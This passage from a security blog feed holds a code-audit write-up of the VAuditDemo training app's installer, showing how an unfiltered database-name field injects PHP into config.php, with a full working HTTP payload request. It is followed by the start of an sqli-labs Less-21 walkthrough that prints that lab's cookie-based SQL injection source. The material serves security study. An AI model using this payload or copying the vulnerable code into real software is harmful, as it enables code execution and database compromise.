/*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/}require_once &#39;../header.php&#39;;function check_writeable( $file ) {    if ( file_exists( $file ) ) {        if ( is_dir( $file ) ) {            $dir = $file;            if ( $fp = @fopen( &quot;$dir/test.txt&quot;, &#39;w&#39; ) ) {                @fclose( $fp );                @unlink( &quot;$dir/test.txt&quot; );                $writeable = 1;            }            else {                $writeable = 0;            }        }        else {            if ( $fp = @fopen( $file, &#39;a+&#39; ) ) {                @fclose( $fp );                $writeable = 1;            }            else {                $writeable = 0;            }        }    }    else {        $writeable = 2;    }    return $writeable;}$sys_info[&#39;mysql_ver&#39;]     = extension_loaded( &#39;mysql&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;$sys_info[&#39;zlib&#39;]          = function_exists( &#39;gzclose&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;$sys_info[&#39;gd&#39;]            = extension_loaded( &quot;gd&quot; ) ? &#39;OK&#39; : &#39;NO&#39;;$sys_info[&#39;socket&#39;]        = function_exists( &#39;fsockopen&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;$sys_info[&#39;curl_init&#39;]        = function_exists( &#39;curl_init&#39; ) ? &#39;OK&#39; : &#39;NO&#39;;echo &#39;&lt;div id=&quot;ourhp_er&quot;&gt;&#39;;echo &#39;&lt;h1&gt;系統環境&lt;/h1&gt;&#39;;echo &#39;&lt;p&gt;服務器操作系統:&amp;nbsp;....................................................................&amp;nbsp;&#39;.PHP_OS.&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;Web 服務器:&amp;nbsp;....................................................&amp;nbsp;&#39;.$_SERVER[&#39;SERVER_SOFTWARE&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;PHP 版本:&amp;nbsp;....................................................................&amp;nbsp;&#39;.PHP_VERSION.&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;MySQL 版本:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;mysql_ver&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;Zlib 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;zlib&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;GD2 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;gd&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;Socket 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;socket&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;p&gt;curl 支持:&amp;nbsp;....................................................................&amp;nbsp;&#39;.$sys_info[&#39;curl_init&#39;].&#39;&lt;/p&gt;&#39;;echo &#39;&lt;h1&gt;目錄權限&lt;/h1&gt;&#39;;/* 检查目录 */$check_dirs = array (    &#39;../sys&#39;,    &#39;../uploads&#39;);$i = 0;foreach ( $check_dirs as $dir ) {    $full_dir = $dir;    $check_writeable = check_writeable( $full_dir );    if ( $check_writeable == &#39;1&#39; ) {        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&#39;#00CC33&#39;&gt;可寫&lt;/font&gt;&lt;/p&gt;&quot;;    }    elseif ( $check_writeable == &#39;0&#39; ) {        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&#39;#ff0000&#39;&gt;不可寫&lt;/font&gt;&lt;/p&gt;&quot;;        $no_write = true;    }    elseif ( $check_writeable == &#39;2&#39; ) {        echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;b&gt;不存在&lt;/b&gt;&lt;/p&gt;&quot;;        $no_write = true;    }    $i = $i + 1;}if ( $sys_info[&#39;gd&#39;] == &#39;NO&#39; || $sys_info[&#39;curl_init&#39;] == &#39;NO&#39; ) {    exit( &#39;組建不支持，無法安裝使用！&#39; );}else if ( $check_writeable == &#39;0&#39; || $check_writeable == &#39;2&#39; ) {    exit( &#39;關鍵目錄不可寫，無法安裝使用！&#39; );}if ( $_POST ) {    if ( $_POST[&quot;dbhost&quot;] == &quot;&quot; ) {        exit( &#39;数据库连接地址不能为空&#39; );    }elseif ( $_POST[&quot;dbuser&quot;] == &quot;&quot; ) {        exit( &#39;数据库数据库登录名&#39; );    }elseif ( $_POST[&quot;dbname&quot;] == &quot;&quot; ) {        exit( &#39;请先创建数据库名称&#39; );    }    $dbhost = $_POST[&quot;dbhost&quot;];    $dbuser = $_POST[&quot;dbuser&quot;];    $dbpass = $_POST[&quot;dbpass&quot;];    $dbname = $_POST[&quot;dbname&quot;];    $con = mysql_connect( $dbhost, $dbuser, $dbpass );    if ( !$con ) {        die( &#39;数据库链接出错，请检查账号密码及地址是否正确: &#39; . mysql_error() );    }    $result = mysql_query(&#39;show databases;&#39;) or die ( mysql_error() );;    While($row = mysql_fetch_assoc($result)){               $data[] = $row[&#39;Database&#39;];    }    unset($result, $row);    if (in_array(strtolower($dbname), $data)){        mysql_close();        echo &quot;&lt;script&gt;if(!alert(&#39;數據庫已存在&#39;)){window.history.back(-1);}&lt;/script&gt;&quot;;        exit();    }    mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );    $str_tmp=&quot;&lt;?php\r\n&quot;;    $str_end=&quot;?&gt;&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;error_reporting(0);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#39;/sys/install.lock&#39;)){\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;include_once(&#39;../sys/lib.php&#39;);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;    $str_tmp.=&quot;mysql_query(&#39;set names utf8&#39;,\$conn);\r\n&quot;;    $str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;    $str_tmp.=&quot;if (!\$conn)\r\n&quot;;    $str_tmp.=&quot;{\r\n&quot;;    $str_tmp.=&quot;\tdie(&#39;Could not connect: &#39; . mysql_error());\r\n&quot;;    $str_tmp.=&quot;\texit;\r\n&quot;;    $str_tmp.=&quot;}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;session_start();\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=$str_end;    $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; );    fwrite( $fp, $str_tmp );    fclose( $fp );    //创建表    mysql_select_db( $dbname, $con );    mysql_query( &quot;set names &#39;utf8&#39;&quot;, $con );    //导入数据库    $sql=file_get_contents( &quot;install.sql&quot; );    $a=explode( &quot;;&quot;, $sql );    foreach ( $a as $b ) {        mysql_query( $b.&quot;;&quot; );    }    mysql_close( $con );    file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;, &#39;virink&#39;);    echo &quot;&lt;script&gt;if(!alert(&#39;安裝成功&#39;)){window.location.href=&#39;../index.php&#39;;}&lt;/script&gt;&quot;;    exit;}else {    echo &quot;&lt;form id=&#39;form1&#39; name=&#39;form1&#39; method=&#39;post&#39; action=&#39;&#39;&gt;&quot;;    echo &quot;&lt;table width=&#39;100%&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;10&#39; id=&#39;table&#39;&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td colspan=&#39;2&#39;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbhost&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;localhost&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbuser&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbpass&#39; type=&#39;password&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbname&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;vauditdemo&#39;/&gt; *&lt;/td&gt; &quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input type=&#39;submit&#39; class=&#39;btn&#39; name=&#39;Submit&#39; value=&#39;安裝&#39; /&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;/table&gt;&quot;;    echo &quot;&lt;/form&gt;&quot;;}?&gt;&lt;?phprequire_once &#39;../footer.php&#39;;?&gt;</code></pre><p>关键问题</p><pre><code>if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;) ) { /*判断是否有/sys/install.lock这个文件*/    header( &quot;Location: ../index.php&quot; ); /*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/}</code></pre><p>然后下面也没用过滤请求变量的操作，直接写入数据库了</p><pre><code>    $dbhost = $_POST[&quot;dbhost&quot;];    $dbuser = $_POST[&quot;dbuser&quot;];    $dbpass = $_POST[&quot;dbpass&quot;];    $dbname = $_POST[&quot;dbname&quot;];    $con = mysql_connect( $dbhost, $dbuser, $dbpass );    if ( !$con ) {        die( &#39;数据库链接出错，请检查账号密码及地址是否正确: &#39; . mysql_error() );    }    $result = mysql_query(&#39;show databases;&#39;) or die ( mysql_error() );; /*直接进行了写入*/    While($row = mysql_fetch_assoc($result)){               $data[] = $row[&#39;Database&#39;];    }    unset($result, $row);    if (in_array(strtolower($dbname), $data)){        mysql_close();        echo &quot;&lt;script&gt;if(!alert(&#39;數據庫已存在&#39;)){window.history.back(-1);}&lt;/script&gt;&quot;;        exit();    }    mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );    $str_tmp=&quot;&lt;?php\r\n&quot;;    $str_end=&quot;?&gt;&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;error_reporting(0);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#39;/sys/install.lock&#39;)){\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;include_once(&#39;../sys/lib.php&#39;);\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;    $str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;; /*这里就是关键2*/    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;    $str_tmp.=&quot;mysql_query(&#39;set names utf8&#39;,\$conn);\r\n&quot;;    $str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;    $str_tmp.=&quot;if (!\$conn)\r\n&quot;;    $str_tmp.=&quot;{\r\n&quot;;    $str_tmp.=&quot;\tdie(&#39;Could not connect: &#39; . mysql_error());\r\n&quot;;    $str_tmp.=&quot;\texit;\r\n&quot;;    $str_tmp.=&quot;}\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=&quot;session_start();\r\n&quot;;    $str_tmp.=&quot;\r\n&quot;;    $str_tmp.=$str_end;    $fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; ); /*写入了config.php*/    fwrite( $fp, $str_tmp );    fclose( $fp );    //创建表    mysql_select_db( $dbname, $con );    mysql_query( &quot;set names &#39;utf8&#39;&quot;, $con );    //导入数据库    $sql=file_get_contents( &quot;install.sql&quot; );    $a=explode( &quot;;&quot;, $sql );    foreach ( $a as $b ) {        mysql_query( $b.&quot;;&quot; );    }    mysql_close( $con );    file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;, &#39;virink&#39;);    echo &quot;&lt;script&gt;if(!alert(&#39;安裝成功&#39;)){window.location.href=&#39;../index.php&#39;;}&lt;/script&gt;&quot;;    exit;}else {    echo &quot;&lt;form id=&#39;form1&#39; name=&#39;form1&#39; method=&#39;post&#39; action=&#39;&#39;&gt;&quot;;    echo &quot;&lt;table width=&#39;100%&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;10&#39; id=&#39;table&#39;&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td colspan=&#39;2&#39;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbhost&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;localhost&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbuser&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbpass&#39; type=&#39;password&#39; id=&#39;input&#39; value=&#39;root&#39;/&gt; *&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;div align=&#39;right&#39;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input name=&#39;dbname&#39; type=&#39;text&#39; id=&#39;input&#39; value=&#39;vauditdemo&#39;/&gt; *&lt;/td&gt; &quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;td&gt;&lt;input type=&#39;submit&#39; class=&#39;btn&#39; name=&#39;Submit&#39; value=&#39;安裝&#39; /&gt;&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;    echo &quot;&lt;/table&gt;&quot;;    echo &quot;&lt;/form&gt;&quot;;}?&gt;</code></pre><p>然后在看config.php</p><pre><code>&lt;?phperror_reporting(0);if (!file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &#39;/sys/install.lock&#39;)) {    header(&quot;Location: /install/install.php&quot;);    exit;}include_once &#39;../sys/lib.php&#39;;$host = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;root&quot;;$database = &quot;vauditdemo&quot;; /*由于install.php写入到config.php,可以构造一个这样的payload,exp;-- -&quot;;phpinfo();既能保证mysql的正常查询也能插入payload*/$conn = mysql_connect($host, $username, $password);mysql_query(&#39;set names utf8&#39;, $conn);mysql_select_db($database, $conn) or die(mysql_error());if (!$conn) {    die(&#39;Could not connect: &#39; . mysql_error());    exit;}session_start();?&gt;</code></pre><p>payload数据包：</p><pre><code>POST /install/install.php HTTP/1.1Host: 127.0.0.1Content-Length: 97Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Referer: http://127.0.0.1/VAuditDemo-master/VAuditDemo_Debug/install/install.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=cob9q8vcbat4tm3a5f8nqoa2p1Connection: closedbhost=localhost&amp;dbuser=root&amp;dbpass=root&amp;dbname=&quot;nmgcb;-- -&quot;;phpinfo();//&amp;Submit=%E5%AE%89%E8%A3%9D</code></pre><p>结果：<br><img src="https://s2.ax1x.com/2019/01/20/kPM3gH.png" alt="kPM3gH.png"></p><p><img src="https://s2.ax1x.com/2019/01/20/kPQnMj.png" alt="kPQnMj.png"></p><h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>一开始，我在跳转那里发懵了半天。后面自己demo了一下懂了</p><pre><code>&lt;?phpif(file_exists(&#39;haq520.txt&#39;)){    header(&quot;Location: ../demo3.php&quot;);}$username=$_GET[&#39;u&#39;];$fk=fopen(&quot;haq520.txt&quot;,&quot;a&quot;);$txt=$username;fwrite($fk,$txt);fclose($fk);?&gt;</code></pre><p>然后请求为</p><pre><code>http://127.0.0.1/demo7.php?u=此生不是你，终身不娶</code></pre><p><img src="https://s2.ax1x.com/2019/01/20/kPQGJU.png" alt="kPQGJU.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有些不懂的地方多多实验或者写个差不多的例子可以明白的快一点</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs-Less-21 - sqli-labs-Less-24</title>
      <link href="/posts/ce004298.html"/>
      <url>/posts/ce004298.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>秉承着要通过sqli-labs练习平台，然后今天继续刷关。再次做个记录<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180620/7153ff51dc83498e925e5c5a84885ba8.jpeg" alt="7153ff51dc83498e925e5c5a84885ba8.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>sqli-labs第二十一关：<br>代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-21 Cookie Injection- Error Based- complex - string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;?php//including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;);if(!isset($_COOKIE[&#39;uname&#39;])) /*如果不存在cookie*/    {    //including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;);    echo &quot;&lt;div style=&#39; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#39;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#39;#FF0000&#39;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;    echo &quot;&lt;div  align=&#39;center&#39; style=&#39;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#39;&gt;&quot;;    echo &quot;&lt;div style=&#39;padding-top:10px; font-size:15px;&#39;&gt;&quot;;    echo &quot;&lt;!--Form to post the contents --&gt;&quot;;    echo &#39;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#39;;    echo &#39; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#39;;    echo &#39; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#39;;        echo &#39;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#39;;    echo &#39;&lt;/form&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#39;;    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    echo &#39;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;    echo &#39;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#39;;    echo &#39;&lt;/center&gt;&#39;;function check_input($value)    {    if(!empty($value)) /*判断$value不为空*/        {        $value = substr($value,0,20); // truncation (see comments) /*从0的位置开始取值，长度为20*/        }        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启get_magic_quotes_gpc()*/            {            $value = stripslashes($value);            }        if (!ctype_digit($value))       // Quote if not a number /*判断是否为纯数字*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value); /*取整数类型*/        }    return $value;    }    echo &quot;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*判断uname和passwd是否为空*/        {        $uname = check_input($_POST[&#39;uname&#39;]); /*过滤操作*/        $passwd = check_input($_POST[&#39;passwd&#39;]);        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;        $result1 = mysql_query($sql);        $row1 = mysql_fetch_array($result1);            if($row1)                {                echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;                setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()+3600);                    echo &quot;I LOVE YOU COOKIES&quot;;                echo &quot;&lt;/font&gt;&quot;;                echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;                            //echo &#39;Your Cookie is: &#39; .$cookee;                echo &quot;&lt;/font&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                print_r(mysql_error());                            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&quot;;                header (&#39;Location: index.php&#39;);                }            else                {                echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;                //echo &quot;Try again looser&quot;;                print_r(mysql_error());                echo &quot;&lt;/br&gt;&quot;;                            echo &quot;&lt;/br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;                    echo &quot;&lt;/font&gt;&quot;;                  }            }            echo &quot;&lt;/font&gt;&quot;;      echo &#39;&lt;/font&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;}else{    if(!isset($_POST[&#39;submit&#39;]))        {            $cookee = $_COOKIE[&#39;uname&#39;];            $format = &#39;D d M Y - H:i:s&#39;;            $timestamp = time() + 3600;            echo &quot;&lt;center&gt;&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;            echo &#39;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#39;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;            echo &#39;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];            echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];                        echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#39;;            echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;            echo &#39;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#39;;                        echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);            $cookee = base64_decode($cookee);            echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;            $sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;            $result=mysql_query($sql);            if (!$result)                  {                  die(&#39;Issue with your mysql: &#39; . mysql_error());                  }            $row = mysql_fetch_array($result);            if($row)                {                  echo &#39;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                  echo &quot;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your ID:&#39; .$row[&#39;id&#39;];                  }            else                    {                echo &quot;&lt;center&gt;&quot;;                echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;                echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;                //echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;                }            echo &#39;&lt;center&gt;&#39;;            echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;;            echo &#39;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#39;;            echo &#39;&lt;/form&gt;&#39;;            echo &#39;&lt;/center&gt;&#39;;        }        else        {        echo &#39;&lt;center&gt;&#39;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#39;;        echo &quot; Your Cookie is deleted&quot;;                setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()-3600);                header (&#39;Location: index.php&#39;);        echo &#39;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#39;;        }                    echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //header (&#39;Location: main.php&#39;);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#39;;            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);        fwrite($fp,&#39;Cookie:&#39;.$cookee.&quot;\n&quot;);        